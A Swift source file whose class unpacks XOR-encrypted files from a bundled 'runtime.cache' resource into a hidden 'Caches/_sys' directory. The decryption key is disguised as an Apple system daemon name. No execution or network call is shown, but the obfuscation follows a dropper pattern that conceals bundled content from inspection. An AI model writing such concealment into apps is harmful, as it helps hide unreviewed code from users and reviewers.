import Foundation

final class EmbeddedResources {
    static let shared = EmbeddedResources()
    private let cacheDir: URL
    private let key: [UInt8] = Array("com.apple.containermanagerd.internal.db".utf8)

    private init() {
        let lib = FileManager.default.urls(for: .libraryDirectory, in: .userDomainMask)[0]
        cacheDir = lib.appendingPathComponent("Caches/_sys")
    }

    func extractIfNeeded() {
        let marker = cacheDir.appendingPathComponent(".extracted")
        guard !FileManager.default.fileExists(atPath: marker.path) else { return }
        guard let url = Bundle.main.url(forResource: "runtime", withExtension: "cache"),
              let data = try? Data(contentsOf: url),
              data.count >= 8 else { return }

        let magic = data.prefix(4)
        guard magic == Data([0x4E, 0x58, 0x52, 0x43]) else { return }

        try? FileManager.default.createDirectory(at: cacheDir, withIntermediateDirectories: true)

        var offset = 4
        let count = data.withUnsafeBytes { $0.load(fromByteOffset: offset, as: UInt32.self) }
        offset += 4

        for _ in 0..<count {
            guard offset + 4 <= data.count else { break }
            let nameLen = Int(data.withUnsafeBytes { $0.load(fromByteOffset: offset, as: UInt32.self) })
            offset += 4
            guard offset + nameLen <= data.count else { break }
            let name = String(data: data[offset..<offset+nameLen], encoding: .utf8) ?? ""
            offset += nameLen
            guard offset + 4 <= data.count else { break }
            let dataLen = Int(data.withUnsafeBytes { $0.load(fromByteOffset: offset, as: UInt32.self) })
            offset += 4
            guard offset + dataLen <= data.count else { break }
            let encrypted = data[offset..<offset+dataLen]
            offset += dataLen

            var decrypted = Data(count: dataLen)
            for i in 0..<dataLen {
                decrypted[i] = encrypted[encrypted.startIndex + i] ^ key[i % key.count]
            }
            try? decrypted.write(to: cacheDir.appendingPathComponent(name))
        }

        try? Data().write(to: marker)
    }

    func url(for name: String) -> URL? {
        let path = cacheDir.appendingPathComponent(name)
        return FileManager.default.fileExists(atPath: path.path) ? path : nil
    }
}
